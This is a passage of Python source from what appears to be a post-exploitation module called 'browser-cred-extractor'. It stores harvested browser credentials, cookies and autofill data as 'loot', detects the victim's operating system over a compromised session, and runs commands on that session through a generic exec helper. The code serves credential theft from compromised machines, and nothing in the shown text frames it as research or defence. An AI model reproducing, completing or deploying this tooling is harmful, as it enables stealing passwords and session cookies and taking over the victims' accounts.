        sections.append(f"  Duration: {duration}s")
        
        # ── Step 7: Save to loot ────────────────────────────────────────
        self.loot(
            {
                "type": "browser_extraction",
                "platform": platform,
                "profiles_count": len(profiles),
                "total_credentials": total_creds,
                "total_cookies": total_cookies,
                "total_autofill": total_autofill,
                "results": [r.to_dict() for r in results],
                "duration": duration,
            },
            category='credentials',
            source='browser-cred-extractor',
            confidence='verified'
        )
        
        self.info(f"🔐 Browser extraction complete — {total_creds} creds, {total_cookies} cookies, {total_autofill} autofill")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''